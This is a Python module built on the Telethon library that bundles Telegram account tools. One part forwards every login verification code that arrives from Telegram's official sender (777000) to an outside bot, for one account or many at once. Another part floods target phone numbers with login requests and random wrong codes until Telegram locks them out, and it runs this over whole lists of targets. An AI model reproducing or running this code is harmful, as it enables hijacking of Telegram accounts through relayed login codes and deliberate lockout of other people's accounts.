"""验证码监听 — 协议工具箱
作者: Lion

合并自上传脚本:
- TG注册session.py         通过交互式注册新 session
- Telegram反重置反登录.py  监听 777000 验证码自动转发到目标 bot
- Telegram反登录.py        错误代码轰炸目标手机号触发 FloodWait
"""

import asyncio
import os
import random
import re
import time
from datetime import datetime
from typing import List, Optional, Dict, Callable

try:
    from telethon import TelegramClient, events, errors
    from telethon.errors import (
        UnauthorizedError,
        SessionPasswordNeededError,
        PhoneCodeInvalidError,
        PhoneCodeExpiredError,
        PhoneNumberInvalidError,
        FloodWaitError,
    )
    TELETHON_AVAILABLE = True
except Exception:
    TELETHON_AVAILABLE = False

from 配置 import 日志


# ============================================================
# Session 创建 (合并自 TG注册session.py)
# ============================================================
async def 创建Session(api_id: int, api_hash: str, phone: str,
                     验证码: str = None, 两步密码: str = None,
                     名称: Optional[str] = None,
                     保存目录: str = 'sessions') -> Optional[str]:
    """登录创建 session。

    验证码/两步密码 通过回调或参数传入。

    返回:
        session 文件绝对路径 或 None
    """
    if not TELETHON_AVAILABLE:
        return None
    try:
        os.makedirs(保存目录, exist_ok=True)
        name = 名称 or f'session_{phone[-4:]}'
        path = os.path.join(保存目录, name)
        client = TelegramClient(path, api_id, api_hash)
        await client.connect()
        if not await client.is_user_authorized():
            sent = await client.send_code_request(phone)
            code = 验证码 or ''
            if not code:
                日志.warning('[注册] 需验证码（请通过回调传入）')
                await client.disconnect()
                return None
            try:
                await client.sign_in(phone, code, phone_code_hash=sent.phone_code_hash)
            except SessionPasswordNeededError:
                if not 两步密码:
                    await client.disconnect()
                    return None
                await client.sign_in(password=两步密码)
        # 成功：给 'me' 发消息作为确认
        await client.send_message('me', '协议转换成功！作者 Lion')
        await client.disconnect()
        return os.path.abspath(f'{path}.session')
    except Exception as e:
        日志.error(f"[注册] 失败: {e}")
        return None


# ============================================================
# 验证码中继 (合并自 Telegram反重置反登录.py)
# ============================================================
验证码正则 = re.compile(r'(?<!\d)\d{5}(?!\d)')


async def 启动验证码监听(phone: str, api_id: int, api_hash: str,
                       转发bot用户名: str = '@okpay',
                       session_dir: str = 'sessions') -> Optional[TelegramClient]:
    """启动一个 session 并挂上 from_users=777000 的验证码监听，
    匹配 5 位数字则转发给目标 bot
    """
    if not TELETHON_AVAILABLE:
        return None
    try:
        name = f'session_{phone[-4:]}'
        path = os.path.join(session_dir, name)
        client = TelegramClient(path, api_id, api_hash)
        await client.connect()
        if not await client.is_user_authorized():
            日志.warning(f'[验证码] {phone} 未授权')
            await client.disconnect()
            return None

        @client.on(events.NewMessage(from_users=777000))
        async def handler(event):
            text = event.message.text or ''
            if 验证码正则.search(text):
                try:
                    target = await client.get_entity(转发bot用户名)
                    await client.forward_messages(target, event.message)
                    日志.info(f'[转发] {phone} → {转发bot用户名}')
                except errors.FloodWaitError as e:
                    await asyncio.sleep(e.seconds)
                except Exception as e:
                    日志.warning(f'[转发失败] {phone}: {e}')
        return client
    except Exception as e:
        日志.error(f"[验证码] 启动失败: {e}")
        return None


async def 批量启动验证码监听(phone列表: List[str], api_id: int, api_hash: str,
                         转发bot: str = '@okpay') -> List[TelegramClient]:
    """对多个手机号同时启动验证码监听"""
    tasks = [启动验证码监听(p, api_id, api_hash, 转发bot) for p in phone列表]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    return [r for r in results if isinstance(r, TelegramClient)]


# ============================================================
# 反登录保护 (合并自 Telegram反登录.py)
# ============================================================
请求超时 = 30


async def 申请验证码带超时(client, phone: str):
    return await asyncio.wait_for(
        client.send_code_request(phone),
        timeout=请求超时,
    )


async def 登录带超时(client, phone: str, code: str, phone_code_hash: str):
    return await asyncio.wait_for(
        client.sign_in(phone, code, phone_code_hash=phone_code_hash),
        timeout=请求超时,
    )


async def 触发目标封禁(client, phone: str) -> Optional[float]:
    """循环向目标手机号发起 send_code_request 然后随机错误登录，
    直到触发 Telegram 的 FloodWait 锁定（最稳的『反登录』手段）
    返回解锁时间戳"""
    if not TELETHON_AVAILABLE:
        return None
    attempt = 0
    try:
        sent = await 申请验证码带超时(client, phone)
        phone_code_hash = sent.phone_code_hash
        日志.info(f"[下发] {phone}")
    except asyncio.TimeoutError:
        日志.error(f"[超时] {phone} 申请")
        return None
    except PhoneNumberInvalidError:
        日志.error(f"[无效号码] {phone}")
        return None
    except Exception as e:
        日志.error(f"[申请异常] {phone}: {e}")
        return None

    while True:
        attempt += 1
        fake_code = f"{random.randint(0, 99999):05d}"
        日志.debug(f"[尝试] {phone} #{attempt} -> {fake_code}")
        try:
            await 登录带超时(client, phone, fake_code, phone_code_hash)
            日志.warning(f"[意外登录] {phone}，立即注销")
            await client.log_out()
            break
        except asyncio.TimeoutError:
            日志.error(f"[超时] {phone}")
            return None
        except PhoneCodeInvalidError:
            continue
        except PhoneCodeExpiredError:
            日志.info(f"[过期] {phone}, 重新申请")
            break
        except FloodWaitError as e:
            wait = e.seconds
            日志.info(f"[FloodWait] {phone} {wait}s")
            if wait >= 3600:
                unlock_ts = time.time() + wait
                日志.info(f"[锁定] {phone} 解锁时间: {datetime.fromtimestamp(unlock_ts)}")
                return unlock_ts
            else:
                await asyncio.sleep(wait)
                # 重新申请
                try:
                    sent = await 申请验证码带超时(client, phone)
                    phone_code_hash = sent.phone_code_hash
                except Exception:
                    return None
        except errors.RPCError as e:
            日志.error(f"[RPC错误] {phone}: {e}")
            if 'banned' in str(e).lower() or 'invalid' in str(e).lower():
                return None
            await asyncio.sleep(2)
        except Exception as e:
            日志.error(f"[未知异常] {phone}: {e}")
            await asyncio.sleep(5)
    return None


async def 反登录作业(phone列表: List[str], api_id: int, api_hash: str,
                  session前缀: str = 'protection_agent',
                  进度回调=None) -> Dict:
    """对一组目标手机号执行『反登录』轰炸"""
    if not TELETHON_AVAILABLE:
        return {'error': 'TELETHON_NOT_AVAILABLE'}
    解锁时间 = {}
    for idx, phone in enumerate(phone列表):
        session = f'{session前缀}_{idx}_{phone[-4:]}'
        client = TelegramClient(session, api_id, api_hash)
        try:
            await client.connect()
            解锁 = await 触发目标封禁(client, phone)
            if 解锁:
                解锁时间[phone] = 解锁
        except Exception as e:
            日志.error(f"[{phone}] 连接失败: {e}")
        finally:
            try:
                await client.disconnect()
            except Exception:
                pass
        if 进度回调:
            进度回调(idx + 1, len(phone列表), 解锁时间)
    return {'locked': 解锁时间}


async def 等待全部解锁(解锁时间: Dict, 等待回调=None) -> None:
    """等待所有目标解锁"""
    if not 解锁时间:
        return
    最晚 = max(解锁时间.values())
    now = time.time()
    total_wait = 最晚 - now
    日志.info(f"[等待] 总等待时间 {int(total_wait)} 秒 ({int(total_wait/3600)} 小时)")

    while total_wait > 0:
        if total_wait > 3600:
            await asyncio.sleep(3600)
            total_wait -= 3600
            if 等待回调:
                等待回调(解锁时间)
        else:
            await asyncio.sleep(total_wait)
            total_wait = 0
    日志.info("[全部解锁]")


# ============================================================
# 综合：注册 + 验证码监听（一次性）
# ============================================================
async def 注册并监听(phone: str, api_id: int, api_hash: str,
                   验证码: str, 两步密码: Optional[str] = None,
                   转发bot: str = '@okpay') -> Optional[TelegramClient]:
    """注册一个新 session 后立刻挂上验证码监听"""
    path = await 创建Session(api_id, api_hash, phone, 验证码, 两步密码)
    if not path:
        return None
    return await 启动验证码监听(phone, api_id, api_hash, 转发bot)


# 公开 API
公开API = [
    '创建Session',
    '启动验证码监听', '批量启动验证码监听',
    '触发目标封禁', '反登录作业', '等待全部解锁',
    '注册并监听',
]
